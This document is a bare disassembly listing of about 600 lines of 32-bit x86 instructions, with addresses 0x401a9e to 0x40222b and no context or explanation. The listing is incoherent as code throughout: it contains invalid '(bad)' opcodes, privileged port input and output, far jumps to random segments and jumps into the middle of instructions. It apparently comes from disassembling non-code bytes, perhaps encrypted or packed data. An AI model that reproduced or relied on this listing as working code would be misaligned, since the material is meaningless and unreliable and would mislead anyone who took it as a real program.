  401a9e:	jne    0x401a95
  401aa0:	in     al,dx
  401aa1:	ror    BYTE PTR [edi+0x68],1
  401aa4:	cmp    cl,BYTE PTR [edx-0x338b3166]
  401aaa:	and    eax,0xeb3633eb
  401aaf:	inc    esp
  401ab0:	xchg   esp,eax
  401ab1:	xchg   BYTE PTR [ecx-0x38c47e01],dl
  401ab7:	add    DWORD PTR [eax],edi
  401ab9:	mov    dh,0x5a
  401abb:	jbe    0x401acf
  401abd:	pop    ebx
  401abe:	push   edx
  401abf:	clc    
  401ac0:	sub    edx,0xffffff8c
  401ac3:	jns    0x401a7e
  401ac5:	mov    al,0x18
  401ac7:	dec    edi
  401ac8:	xchg   ebp,eax
  401ac9:	jl     0x401b20
  401acb:	ins    BYTE PTR es:[edi],dx
  401acc:	(bad)
  401ad0:	pop    ebp
  401ad1:	fild   QWORD PTR gs:[edi-0x4811ccc3]
  401ad8:	mov    esp,0xd10bdd56
  401add:	(bad)  
  401ade:	cmp    al,0xc3
  401ae0:	cwde   
  401ae1:	mov    WORD PTR [edi+0x56419b1c],ds
  401ae7:	inc    edi
  401ae8:	cmp    al,0x7b
  401aea:	push   0xffffffdb
  401aec:	pop    edx
  401aed:	cmp    BYTE PTR [ebx+0xd2c91bc],0x99
  401af4:	pop    ebp
  401af5:	xor    dl,0xb5
  401af8:	lds    esi,FWORD PTR [edx+ebp*2-0x2d5445b4]
  401aff:	daa    
  401b00:	cwde   
  401b01:	(bad)  
  401b02:	aad    0x96
  401b04:	fnstcw WORD PTR [edi+ebx*1+0x75]
  401b08:	or     DWORD PTR [ebx-0x711b8d94],eax
  401b0e:	jmp    0x401b51
  401b10:	cli    
  401b11:	retf   0xaed3
  401b14:	js     0x401aed
  401b16:	xor    esp,DWORD PTR [edx-0x618f76d8]
  401b1c:	add    eax,DWORD PTR [edx+0x5a59105d]
  401b22:	push   es
  401b23:	dec    DWORD PTR ds:0xbd1d0076
  401b29:	cli    
  401b2a:	dec    ebx
  401b2b:	and    al,dh
  401b2d:	or     esp,DWORD PTR [edx+0x32]
  401b30:	lahf   
  401b31:	xchg   edx,eax
  401b32:	adc    al,0xff
  401b34:	jle    0x401ae5
  401b36:	mov    ah,0x79
  401b38:	clc    
  401b39:	loope  0x401ad9
  401b3b:	add    bh,BYTE PTR [esi+0x8]
  401b3e:	add    BYTE PTR ds:0x35f361ab,bl
  401b44:	popa   
  401b45:	scas   eax,DWORD PTR es:[edi]
  401b46:	sbb    DWORD PTR [ecx],0x83c0462
  401b4c:	mov    ebp,ss
  401b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b4f:	scas   al,BYTE PTR es:[edi]
  401b50:	inc    ebx
  401b51:	fcomip st,st(0)
  401b53:	data16 jecxz 0x401bbb
  401b56:	inc    ecx
  401b57:	cmp    BYTE PTR [edi-0x5b],cl
  401b5a:	jnp    0x401b21
  401b5c:	jl     0x401ae7
  401b5e:	or     ecx,eax
  401b60:	popa   
  401b61:	fst    QWORD PTR [edi+ebx*8-0x4e7313a2]
  401b68:	xchg   esi,eax
  401b6a:	addr16 in eax,0x4a
  401b6d:	ret    
  401b6e:	repz test eax,0xc94c50ad
  401b74:	xor    eax,0x83e0c312
  401b79:	adc    al,0x14
  401b7b:	or     eax,0xa9447a07
  401b80:	xor    al,0x42
  401b82:	xchg   esp,eax
  401b83:	rep outs dx,DWORD PTR ds:[esi]
  401b85:	lds    edx,FWORD PTR [eax+edx*1-0x44]
  401b89:	mov    eax,ds:0xd4effc79
  401b8e:	mov    fs,WORD PTR [edx]
  401b90:	shr    BYTE PTR [eax],1
  401b92:	sub    ch,bh
  401b94:	loope  0x401b73
  401b96:	push   es
  401b97:	das    
  401b98:	jmp    0x229f:0xa2055664
  401b9f:	mov    bl,0x18
  401ba1:	in     eax,dx
  401ba2:	pushf  
  401ba3:	les    esp,FWORD PTR [esi]
  401ba5:	mov    al,0x3e
  401ba7:	xor    eax,0xed4b8f77
  401bac:	sub    al,0xd
  401bae:	out    dx,eax
  401baf:	dec    edi
  401bb0:	push   ds
  401bb1:	pop    ebp
  401bb2:	inc    edi
  401bb3:	xchg   ebp,eax
  401bb4:	sti    
  401bb5:	outs   dx,DWORD PTR ds:[esi]
  401bb6:	jo     0x401c29
  401bb8:	dec    edi
  401bb9:	push   0x870df83
  401bbe:	stos   BYTE PTR es:[edi],al
  401bbf:	push   edx
  401bc0:	fst    QWORD PTR ds:0x3d02af12
  401bc6:	add    BYTE PTR [ecx+0x5299ab9d],bh
  401bcc:	xor    DWORD PTR [eax+0x5dd3e224],ecx
  401bd2:	sbb    eax,0xde942777
  401bd7:	sub    al,0x3b
  401bd9:	addr16 je 0x401b75
  401bdc:	jg     0x401c17
  401bde:	xchg   BYTE PTR [ecx],dh
  401be0:	pop    ss
  401be1:	fs jo  0x1ccf481d
  401be8:	sbb    ebx,DWORD PTR [edx+esi*1-0x5f771845]
  401bef:	retf   
  401bf0:	sbb    DWORD PTR [ecx-0x1513b970],edx
  401bf6:	test   BYTE PTR [ecx-0x44],dh
  401bf9:	ja     0x401c19
  401bfb:	aad    0xc2
  401bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bfe:	pop    eax
  401bff:	xor    ecx,DWORD PTR [ebx+0x50]
  401c02:	data16 dec BYTE PTR [ebx-0x55]
  401c06:	stc    
  401c07:	test   ebp,0xe698a243
  401c0d:	repz fcmovne st,st(4)
  401c10:	push   ss
  401c11:	out    dx,eax
  401c12:	inc    ebx
  401c13:	cmp    dh,BYTE PTR [ebx]
  401c15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c16:	mov    ds:0x6005a4e8,eax
  401c1b:	lods   al,BYTE PTR ds:[esi]
  401c1c:	xchg   DWORD PTR ds:0x4f2a222f,esp
  401c22:	mov    eax,0xd6b193bb
  401c27:	jb     0x401c20
  401c29:	aas    
  401c2a:	or     BYTE PTR es:[esp+eax*4+0x13a82425],dl
  401c32:	pop    ss
  401c33:	mov    bl,BYTE PTR [ecx]
  401c35:	push   0xffffffa2
  401c37:	pop    esp
  401c38:	lods   al,BYTE PTR ds:[esi]
  401c39:	sub    DWORD PTR [esi],esi
  401c3b:	and    dh,BYTE PTR ds:[esi+esi*2]
  401c3f:	ja     0x401c7b
  401c41:	sub    ebp,ecx
  401c43:	pop    ds
  401c44:	xchg   ecx,eax
  401c45:	or     eax,0x8b2b1127
  401c4a:	ds push edi
  401c4c:	fnstsw WORD PTR [ecx-0x4ad508c8]
  401c52:	mov    dl,0x50
  401c54:	scas   al,BYTE PTR es:[edi]
  401c55:	lods   eax,DWORD PTR ds:[esi]
  401c56:	mov    cl,ah
  401c58:	stos   DWORD PTR es:[edi],eax
  401c59:	xchg   esp,eax
  401c5a:	jp     0x401cd4
  401c5c:	jmp    0x840a2fe0
  401c61:	cs pop ecx
  401c63:	ret    
  401c64:	(bad)  
  401c65:	fstp   DWORD PTR [edx]
  401c67:	cmp    al,dl
  401c69:	jo     0x401c05
  401c6b:	ret    
  401c6c:	into   
  401c6d:	inc    ebx
  401c6e:	push   cs
  401c6f:	lock pop ecx
  401c71:	repz xchg ch,bh
  401c74:	sub    DWORD PTR [eax],edx
  401c76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c77:	jmp    0x401cc8
  401c79:	cmp    al,0x86
  401c7b:	cmp    ah,ch
  401c7d:	inc    ecx
  401c7e:	mov    ds:0x3a44532d,al
  401c83:	dec    ecx
  401c84:	jno    0x401cbf
  401c86:	imul   BYTE PTR [edi+0x75cba81a]
  401c8c:	enter  0x7ed0,0xf9
  401c90:	or     ebx,DWORD PTR [ebx-0x14]
  401c93:	test   BYTE PTR [esi],ah
  401c95:	sub    esp,edi
  401c97:	or     al,0x4e
  401c99:	mov    ds:0x8aaa6a21,eax
  401c9e:	mov    bl,0x56
  401ca0:	jge    0x401c4e
  401ca2:	inc    eax
  401ca3:	das    
  401ca4:	mov    ebx,0xe0294f92
  401ca9:	push   edx
  401caa:	jno    0x401cb2
  401cac:	xor    eax,0x7db18e77
  401cb1:	jo     0x401c3c
  401cb3:	dec    ebx
  401cb4:	aad    0x84
  401cb6:	push   edx
  401cb7:	xchg   edx,eax
  401cb8:	cmc    
  401cb9:	cmp    al,0x9e
  401cbb:	std    
  401cbc:	(bad)  
  401cbd:	push   cs
  401cbe:	gs mov al,0x67
  401cc1:	pop    ebp
  401cc2:	or     BYTE PTR [ecx],0xff
  401cc5:	fld    QWORD PTR [ecx]
  401cc7:	int    0xf0
  401cc9:	std    
  401cca:	mov    ecx,0xf3d5dd36
  401ccf:	ss xchg esp,eax
  401cd1:	jo     0x401cb9
  401cd3:	retf   
  401cd4:	outs   dx,DWORD PTR ds:[esi]
  401cd5:	inc    DWORD PTR [esp+eax*4+0xa]
  401cd9:	xchg   edi,eax
  401cda:	jecxz  0x401d46
  401cdc:	pop    esp
  401cdd:	test   eax,esi
  401cdf:	imul   esi,DWORD PTR [esi],0x1b
  401ce2:	fstp   DWORD PTR [esi]
  401ce4:	ja     0x401d62
  401ce6:	inc    edi
  401ce7:	aaa    
  401ce8:	test   BYTE PTR [eax],0xec
  401ceb:	or     DWORD PTR [eax],ebx
  401ced:	mul    BYTE PTR [ecx-0x47]
  401cf0:	pushf  
  401cf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cf2:	(bad)  
  401cf3:	jmp    0xa169:0xb65f67ef
  401cfa:	pop    ecx
  401cfb:	pop    eax
  401cfc:	pop    edx
  401cfd:	lds    eax,FWORD PTR [eax-0x7cf15227]
  401d03:	es jp  0x401c97
  401d06:	scas   eax,DWORD PTR es:[edi]
  401d07:	inc    eax
  401d08:	inc    esp
  401d09:	push   esp
  401d0a:	adc    BYTE PTR [ebx-0x25],ah
  401d0d:	jmp    0x3d51d116
  401d12:	jmp    FWORD PTR [edi+0x377ac9b0]
  401d18:	mov    bh,BYTE PTR [esi+edi*1]
  401d1b:	mov    dh,0xc9
  401d1d:	jns    0x401d69
  401d1f:	add    DWORD PTR ds:0x5d4d3079,0x3a2251a4
  401d29:	dec    eax
  401d2a:	cmp    DWORD PTR [ecx],esi
  401d2c:	jmp    0x401d35
  401d2e:	mov    edx,0x75e1aaaa
  401d33:	jp     0x401d09
  401d35:	and    eax,0x4ee8822c
  401d3a:	aas    
  401d3b:	add    ebp,ebx
  401d3d:	(bad)  
  401d3e:	pop    ebx
  401d3f:	iret   
  401d40:	pushf  
  401d41:	inc    esi
  401d42:	cmc    
  401d43:	pushf  
  401d44:	cld    
  401d45:	pop    ebp
  401d46:	out    dx,eax
  401d47:	enter  0xcba,0x86
  401d4b:	pop    esp
  401d4c:	test   BYTE PTR [esi+0x705868b4],ah
  401d52:	cmp    DWORD PTR [edi-0x72],ebp
  401d55:	aam    0x3d
  401d57:	les    edx,FWORD PTR [ebx+0x45]
  401d5a:	icebp  
  401d5b:	arpl   WORD PTR [ecx],bp
  401d5d:	cmp    ecx,DWORD PTR [ebp+0x300fe4df]
  401d63:	inc    ecx
  401d64:	inc    edx
  401d65:	lock lods eax,DWORD PTR ds:[esi]
  401d67:	add    dl,BYTE PTR [edx+0x52775a2a]
  401d6d:	out    0x2c,eax
  401d6f:	sbb    ebp,DWORD PTR [ecx-0x47]
  401d72:	jo     0x401daa
  401d74:	push   cs
  401d75:	in     al,0x32
  401d77:	xor    ah,BYTE PTR [esi+0x60]
  401d7a:	jge    0x401dd9
  401d7c:	push   esi
  401d7d:	cmp    esp,ebx
  401d7f:	lods   eax,DWORD PTR ds:[esi]
  401d80:	test   eax,0x9c792518
  401d85:	rol    BYTE PTR [ebx+0x61],1
  401d88:	adc    WORD PTR [ebp+0x35],0x2983
  401d8e:	add    eax,0x8e6ecc7e
  401d93:	cs loop 0x401d40
  401d96:	add    eax,0xb28b3f39
  401d9b:	ret    0x87c9
  401d9e:	dec    ecx
  401d9f:	sub    al,dh
  401da1:	shl    BYTE PTR [eax],0x36
  401da4:	fidiv  DWORD PTR [esi]
  401da6:	add    al,0x71
  401da8:	add    al,BYTE PTR [edi-0x451e767c]
  401dae:	or     DWORD PTR [esi+0x3a],0x26b6c59c
  401db5:	xchg   BYTE PTR [ecx],dl
  401db7:	jnp    0x401d90
  401db9:	or     dl,bh
  401dbb:	pop    esp
  401dbc:	sahf   
  401dbd:	aaa    
  401dbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dbf:	test   BYTE PTR [ecx-0x22],al
  401dc2:	push   edx
  401dc3:	jo     0x401e1d
  401dc5:	ret    0xe5c9
  401dc8:	sar    ah,cl
  401dca:	sbb    BYTE PTR [esi],cl
  401dcc:	sub    BYTE PTR [ebx],dl
  401dce:	lahf   
  401dcf:	outs   dx,BYTE PTR ds:[esi]
  401dd0:	aaa    
  401dd1:	sti    
  401dd2:	cwde   
  401dd3:	and    BYTE PTR [eax],bh
  401dd5:	imul   edi,ebp,0x39ce264d
  401ddb:	out    0x81,eax
  401ddd:	cld    
  401dde:	adc    eax,0xa376cc0d
  401de3:	outs   dx,BYTE PTR ds:[esi]
  401de4:	js     0x401e16
  401de6:	adc    cl,ch
  401de8:	ss in  al,0x56
  401deb:	jecxz  0x401dcf
  401ded:	hlt    
  401dee:	xchg   edi,eax
  401def:	cdq    
  401df0:	sub    eax,0x9232f06a
  401df5:	lods   al,BYTE PTR ds:[esi]
  401df6:	loopne 0x401e46
  401df8:	lahf   
  401df9:	out    dx,al
  401dfa:	nop
  401dfb:	jne    0x401e30
  401dfd:	add    al,0x58
  401dff:	mov    ds:0xa37ea673,al
  401e04:	nop
  401e05:	repz push 0x2d235385
  401e0b:	sub    eax,0x1e8c2f91
  401e10:	retf   0xefb4
  401e13:	jb     0x401e04
  401e15:	ud1    ecx,DWORD PTR [esi]
  401e18:	rcl    BYTE PTR [bp+si-0x30],cl
  401e1c:	mov    edx,0x771bef80
  401e21:	and    cl,cl
  401e23:	sahf   
  401e24:	sbb    BYTE PTR [ebp+0x5e6173ea],cl
  401e2a:	cli    
  401e2b:	pop    edi
  401e2c:	pop    ebp
  401e2d:	or     al,0xd
  401e2f:	std    
  401e30:	jns    0x401dfa
  401e32:	or     DWORD PTR [ecx-0xda40e5a],esi
  401e38:	mov    bl,0xb2
  401e3a:	mov    ecx,0xcc6c2467
  401e3f:	pop    ebp
  401e40:	in     al,dx
  401e41:	inc    esp
  401e42:	pop    ebp
  401e43:	add    ecx,DWORD PTR [edi-0x499478f3]
  401e49:	xchg   ecx,eax
  401e4a:	je     0x401e92
  401e4c:	imul   ecx,edx,0xcc942eef
  401e52:	mov    ds:0x444e8d31,eax
  401e57:	xor    eax,0x2b453198
  401e5c:	mov    esp,0xac7b17fc
  401e61:	push   ecx
  401e62:	pusha  
  401e63:	push   ebx
  401e64:	out    0x27,eax
  401e66:	popf   
  401e67:	jmp    0xe93c:0xe9c553e8
  401e6e:	or     esp,DWORD PTR [edx+0x643d66d5]
  401e74:	or     BYTE PTR [edx-0x24],ah
  401e77:	aas    
  401e78:	or     ecx,ebp
  401e7a:	cmp    DWORD PTR [esi-0x73a76d8c],edx
  401e80:	adc    al,0x19
  401e82:	bts    DWORD PTR [ebx-0xc],ebp
  401e86:	popa   
  401e87:	xchg   ebp,eax
  401e88:	fwait
  401e89:	dec    ebp
  401e8a:	and    DWORD PTR [esi+0x22],eax
  401e8d:	jg     0x401e3a
  401e8f:	dec    eax
  401e90:	pop    ss
  401e91:	rol    ebx,1
  401e93:	test   DWORD PTR [edx],esp
  401e95:	mov    ebx,0xf55e9d2d
  401e9a:	pop    ds
  401e9b:	fcmovbe st,st(6)
  401e9d:	sub    eax,0xe4cbeab5
  401ea2:	and    ah,BYTE PTR [ebx+0x47]
  401ea5:	loopne 0x401e60
  401ea7:	sub    bl,BYTE PTR [eax-0x2c]
  401eaa:	mov    WORD PTR [esi+0x73],fs
  401ead:	es mov cl,0xbb
  401eb0:	add    BYTE PTR [ebx+0x6],dh
  401eb3:	push   cs
  401eb4:	xor    DWORD PTR [ebp-0x48],ebp
  401eb7:	sub    edi,DWORD PTR [eax+0x57]
  401eba:	lea    ebp,ds:0x5050a06a
  401ec0:	test   BYTE PTR [ecx+0x784f6aa7],bh
  401ec6:	push   edx
  401ec7:	pop    ebp
  401ec8:	js     0x401e57
  401eca:	mov    ds:0x7e11ebf7,eax
  401ecf:	inc    ecx
  401ed0:	pop    esi
  401ed1:	ss mov ebp,0xf0046ea8
  401ed7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ed8:	xor    BYTE PTR [ebx-0x5080f7bb],ah
  401ede:	jmp    0xf3c83bed
  401ee3:	inc    esp
  401ee4:	mov    eax,DWORD PTR [edi+0x10]
  401ee7:	imul   eax,ebp,0x9dfda2c2
  401eed:	dec    esp
  401eee:	adc    eax,0x6aeb5488
  401ef3:	jge    0x401f59
  401ef5:	push   eax
  401ef6:	cmp    edx,DWORD PTR [edi]
  401ef8:	lods   al,BYTE PTR ds:[esi]
  401ef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401efa:	inc    esp
  401efb:	inc    ebx
  401efc:	or     DWORD PTR [ebp+0x71e50d52],esi
  401f02:	xor    esi,esp
  401f04:	div    BYTE PTR [edx+0x57]
  401f07:	popf   
  401f08:	mov    ds:0x7724559b,al
  401f0d:	jo     0x401f2f
  401f0f:	icebp  
  401f10:	mov    BYTE PTR [edi+0x5002aa77],dl
  401f16:	loop   0x401f77
  401f18:	sbb    BYTE PTR [ecx],ah
  401f1a:	mov    eax,0xbb54e0af
  401f1f:	jbe    0x401edd
  401f21:	add    BYTE PTR [ebx+0x60c81dba],dl
  401f27:	add    eax,0xddc28044
  401f2c:	(bad)  
  401f2d:	pop    esp
  401f2e:	xchg   ebp,eax
  401f2f:	push   eax
  401f30:	repnz pop es
  401f32:	pop    edx
  401f33:	cli    
  401f34:	aam    0x1b
  401f36:	rol    BYTE PTR [esi-0x65],cl
  401f39:	mov    ds:0xc12ae415,eax
  401f3e:	test   DWORD PTR [eax],ecx
  401f40:	mov    dh,0x43
  401f42:	xchg   ebp,eax
  401f43:	fsub   QWORD PTR [eax]
  401f45:	dec    esi
  401f46:	jbe    0x401f68
  401f48:	or     al,0xdc
  401f4a:	or     ah,BYTE PTR [edi]
  401f4c:	(bad)  
  401f4d:	(bad)  
  401f4e:	call   FWORD PTR [ebx-0x6972bd3]
  401f54:	mov    cl,cl
  401f56:	jmp    0xae3:0xfed4dd0c
  401f5d:	mov    dh,0x68
  401f5f:	push   ecx
  401f60:	mov    bl,ah
  401f62:	sub    DWORD PTR [ecx+0x328808ad],0xffffffb6
  401f69:	jb     0x401f6b
  401f6b:	or     al,0xa4
  401f6d:	sbb    eax,0x186920d
  401f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f73:	push   0x17
  401f75:	arpl   di,cx
  401f77:	pop    ds
  401f78:	mov    al,ds:0x7618f4d6
  401f7d:	stc    
  401f7e:	sub    al,0xc8
  401f80:	mov    ds:0x39582114,al
  401f85:	xchg   DWORD PTR [edi+0x79ef106f],ebp
  401f8b:	xor    al,0xdb
  401f8d:	push   0xffffffe4
  401f8f:	fnstcw WORD PTR [edi]
  401f91:	clc    
  401f92:	push   edi
  401f93:	js     0x401fd4
  401f95:	ins    BYTE PTR es:[edi],dx
  401f96:	push   ds
  401f97:	lods   eax,DWORD PTR ds:[esi]
  401f98:	push   esi
  401f99:	lahf   
  401f9a:	xchg   esi,eax
  401f9b:	xchg   esp,eax
  401f9c:	fcmovnb st,st(4)
  401f9e:	jae    0x401f37
  401fa0:	mov    ebx,0x85a6ae1d
  401fa5:	jmp    0xce1830d
  401faa:	lods   al,BYTE PTR ds:[esi]
  401fab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fac:	lds    edi,FWORD PTR [eax]
  401fae:	js     0x401fd9
  401fb0:	loope  0x401fcd
  401fb2:	xor    DWORD PTR [ebp+0x4e],ebx
  401fb5:	inc    edx
  401fb6:	push   cs
  401fb7:	xchg   ecx,eax
  401fb8:	cld    
  401fb9:	adc    eax,0x877d4208
  401fbe:	mov    esi,0x33676d6
  401fc3:	xor    cl,BYTE PTR [edx-0x69]
  401fc6:	pop    esi
  401fc7:	jp     0x401f87
  401fc9:	pop    es
  401fca:	jecxz  0x401fcb
  401fcc:	not    dl
  401fce:	out    dx,al
  401fcf:	fdiv   st(1),st
  401fd1:	sbb    dl,BYTE PTR [ecx+0x192dc095]
  401fd7:	inc    ebp
  401fd8:	js     0x401f79
  401fda:	xor    cl,BYTE PTR [esi+eax*8+0x0]
  401fde:	test   BYTE PTR [esi+0x26],dh
  401fe1:	cmp    DWORD PTR [ecx],eax
  401fe3:	mov    edx,0x1b27e3a4
  401fe8:	mov    dh,BYTE PTR [ebp+0x28]
  401feb:	imul   esi,DWORD PTR [ecx+edi*8-0x37fa48f9],0x46e72435
  401ff6:	and    bh,BYTE PTR [ecx]
  401ff8:	pop    esi
  401ff9:	fidivr WORD PTR [edi-0x78e5fdd9]
  401fff:	call   0x2cda:0xdc52014
  402006:	ja     0x401feb
  402008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402009:	pop    ebx
  40200a:	retf   0xb315
  40200d:	out    0xa5,al
  40200f:	fsub   DWORD PTR [eax+0x17a4f3fc]
  402015:	in     al,0x2d
  402017:	(bad)  
  402018:	shl    edx,cl
  40201a:	aad    0x75
  40201c:	dec    ebx
  40201d:	push   ss
  40201e:	and    bl,BYTE PTR [edx-0xb]
  402021:	adc    BYTE PTR [ebp-0x15],ch
  402024:	bound  ecx,QWORD PTR cs:[edi+ebx*8]
  402028:	xor    edi,DWORD PTR cs:[ebp-0x77599537]
  40202f:	sbb    eax,ebp
  402031:	aas    
  402032:	mov    al,0x6f
  402034:	xor    ebp,esp
  402036:	lods   eax,DWORD PTR ds:[esi]
  402037:	lahf   
  402038:	dec    edi
  402039:	les    ebx,FWORD PTR [bx]
  40203c:	jb     0x402031
  40203e:	dec    eax
  40203f:	mov    ah,0xd9
  402041:	pop    esi
  402042:	bound  ebx,QWORD PTR ds:0x3c661c6e
  402048:	adc    al,0x92
  40204a:	inc    esi
  40204b:	mov    ds:0x50ba876c,al
  402050:	jg     0x402017
  402052:	retf   0x7fec
  402055:	std    
  402056:	outs   dx,DWORD PTR ds:[esi]
  402057:	push   ds
  402058:	add    cl,ah
  40205a:	int    0x69
  40205c:	into   
  40205d:	and    edi,DWORD PTR [ebx-0x61bb02cd]
  402063:	add    esp,DWORD PTR [ecx]
  402065:	jg     0x402025
  402067:	mov    edi,0x50b6f5d3
  40206c:	pop    ebp
  40206d:	fsubr  DWORD PTR [ebp-0x2e3e8226]
  402073:	arpl   WORD PTR [esi+0x7c],sp
  402076:	add    al,0x7d
  402078:	mov    al,0xcc
  40207a:	xchg   ebx,eax
  40207b:	inc    edi
  40207c:	ins    BYTE PTR es:[edi],dx
  40207d:	sar    BYTE PTR [ebx-0x4e],0xc9
  402081:	outs   dx,BYTE PTR ds:[esi]
  402082:	(bad)  
  402083:	lods   al,BYTE PTR ds:[esi]
  402084:	out    dx,eax
  402085:	mov    eax,0x7ad7af76
  40208a:	mov    al,ds:0xa23c7af4
  40208f:	sahf   
  402090:	sbb    esp,edx
  402092:	sub    dl,BYTE PTR [ebp+ebp*2+0x64]
  402096:	jae    0x4020ec
  402098:	sbb    bh,BYTE PTR [eax]
  40209a:	iret   
  40209b:	pop    ds
  40209c:	(bad)  
  40209d:	jmp    0x402038
  40209f:	imul   edi,DWORD PTR [ecx+0x68],0xd92705fa
  4020a6:	adc    DWORD PTR [eax],edi
  4020a8:	push   esp
  4020a9:	add    edi,ebx
  4020ab:	scas   eax,DWORD PTR es:[edi]
  4020ac:	pop    es
  4020ad:	push   0xa1d05090
  4020b2:	pop    ebx
  4020b3:	pop    es
  4020b4:	fbstp  TBYTE PTR [eax+ebx*2+0x36]
  4020b8:	xor    eax,edi
  4020ba:	inc    ecx
  4020bb:	cmp    eax,0x9c87a9e8
  4020c0:	rcl    DWORD PTR [ebx],cl
  4020c2:	retf   
  4020c3:	cmp    bh,BYTE PTR [ebx-0x595734d6]
  4020c9:	arpl   WORD PTR ds:0x83aa9755,ax
  4020cf:	sbb    eax,0x2d
  4020d2:	pop    edi
  4020d3:	stc    
  4020d4:	push   eax
  4020d5:	(bad)  [eax]
  4020d7:	mov    esp,0x2f3e1adf
  4020dc:	scas   al,BYTE PTR es:[edi]
  4020dd:	adc    BYTE PTR [edi-0x19],al
  4020e0:	outs   dx,BYTE PTR ds:[esi]
  4020e1:	clc    
  4020e2:	popa   
  4020e3:	sar    DWORD PTR [edx+0x78e88631],cl
  4020e9:	aaa    
  4020ea:	pop    ecx
  4020eb:	das    
  4020ec:	in     al,dx
  4020ed:	hlt    
  4020ee:	jno    0x402120
  4020f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020f1:	sahf   
  4020f2:	loop   0x40211f
  4020f4:	sbb    eax,0xf7deeaff
  4020f9:	xor    DWORD PTR [ecx-0x5b],ebx
  4020fc:	test   BYTE PTR [ecx],bl
  4020fe:	daa    
  4020ff:	aas    
  402100:	jae    0x4020db
  402102:	jnp    0x4020d7
  402104:	aam    0x4e
  402106:	mov    al,ds:0xfb157385
  40210b:	stc    
  40210c:	or     al,0x0
  40210e:	stos   DWORD PTR es:[edi],eax
  40210f:	pop    edi
  402110:	popa   
  402111:	push   eax
  402112:	mov    BYTE PTR [ecx-0x37],ah
  402115:	stos   BYTE PTR es:[edi],al
  402116:	jo     0x4020bc
  402118:	loop   0x402103
  40211a:	ds dec edi
  40211c:	in     eax,0x2f
  40211e:	das    
  40211f:	add    DWORD PTR [ecx-0x25c3709d],esi
  402125:	mov    bh,0xe7
  402127:	retf   
  402128:	push   ds
  402129:	push   cs
  40212a:	popf   
  40212b:	scas   eax,DWORD PTR es:[edi]
  40212c:	or     dl,BYTE PTR [ecx]
  40212e:	inc    eax
  40212f:	enter  0x4cab,0x93
  402133:	jb     0x402190
  402135:	es scas eax,DWORD PTR es:[edi]
  402137:	inc    esp
  402138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402139:	icebp  
  40213a:	push   esi
  40213b:	mov    edx,0xf7f2b830
  402140:	dec    ebx
  402141:	icebp  
  402142:	stc    
  402143:	aam    0xa
  402145:	nop
  402146:	pop    edi
  402147:	shl    dh,cl
  402149:	aam    0x49
  40214b:	cmp    dl,BYTE PTR [eax]
  40214d:	ret    0xbfa5
  402150:	push   0x3a631437
  402155:	repz in al,0x1b
  402158:	xlat   BYTE PTR ds:[ebx]
  402159:	imul   eax,eax,0x68eb45ae
  40215f:	cmp    BYTE PTR [edi+0x3b],al
  402162:	(bad)  
  402163:	je     0x4021d0
  402165:	push   eax
  402166:	jle    0x4021a1
  402168:	idiv   bh
  40216a:	scas   eax,DWORD PTR es:[edi]
  40216b:	mov    dh,0x8b
  40216d:	jmp    0xdc0c:0x5fc9b1
  402174:	(bad)  
  402175:	fxch   st(6)
  402177:	pop    esp
  402178:	lahf   
  402179:	fild   DWORD PTR [eax+0x47]
  40217c:	push   ecx
  40217d:	repz sbb eax,0xf76d940e
  402183:	enter  0xee48,0xaa
  402187:	je     0x402202
  402189:	pop    esp
  40218a:	dec    ecx
  40218b:	adc    ch,BYTE PTR [edi]
  40218d:	shl    DWORD PTR [ebp+eax*2+0x4a0c1f9e],0x86
  402195:	nop
  402196:	cmp    al,0x49
  402198:	xchg   ecx,eax
  402199:	cmp    al,0x40
  40219b:	jp     0x402185
  40219d:	jmp    0x4b6a60e0
  4021a2:	(bad)  
  4021a3:	fs (bad) 
  4021a5:	xchg   ebp,eax
  4021a6:	adc    al,0x3d
  4021a8:	jge    0x402141
  4021aa:	or     esi,DWORD PTR [eax]
  4021ac:	jb     0x402188
  4021ae:	and    BYTE PTR ds:0x33d22a02,dl
  4021b4:	leave  
  4021b5:	out    dx,al
  4021b6:	push   ss
  4021b7:	mov    ecx,edi
  4021b9:	pusha  
  4021ba:	test   BYTE PTR [esi-0x43],al
  4021bd:	sub    bl,bl
  4021bf:	lahf   
  4021c0:	or     eax,0xa8a203e6
  4021c5:	hlt    
  4021c6:	data16 xor al,0x21
  4021c9:	jae    0x40221d
  4021cb:	adc    DWORD PTR [bx+si],ebp
  4021ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021cf:	aam    0xce
  4021d1:	sub    eax,0x1dfb0ce
  4021d6:	fwait
  4021d7:	mov    eax,ds:0x5f4287ee
  4021dc:	adc    al,0x44
  4021de:	xchg   BYTE PTR [ebx+0x49],dl
  4021e1:	pop    edi
  4021e2:	sbb    al,0xc4
  4021e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021e5:	dec    edi
  4021e6:	mov    edi,0x6f250ec6
  4021eb:	bound  esi,QWORD PTR [ebx-0x415e8741]
  4021f1:	mov    ebp,0x6c8f05f6
  4021f6:	mov    edi,0x1ce05330
  4021fb:	into   
  4021fc:	lock jb 0x402186
  4021ff:	xor    DWORD PTR [esp+edi*4],eax
  402202:	pop    ds
  402203:	push   edi
  402204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402205:	mov    esi,esi
  402207:	or     al,0xf0
  402209:	mov    al,0x85
  40220b:	lds    esp,FWORD PTR [ebx-0x20bd3d59]
  402211:	imul   ebp,DWORD PTR [eax],0xb85b455f
  402217:	je     0x4021a8
  402219:	mov    ebx,0xc7ba806f
  40221e:	ret    0xc7e4
  402221:	or     DWORD PTR [ebp+eiz*4-0x4bf5e3d9],edx
  402228:	out    0xf9,eax
  40222a:	stos   DWORD PTR es:[edi],eax
  40222b:	mov    bh,BYTE PTR ds:0x881ea88e
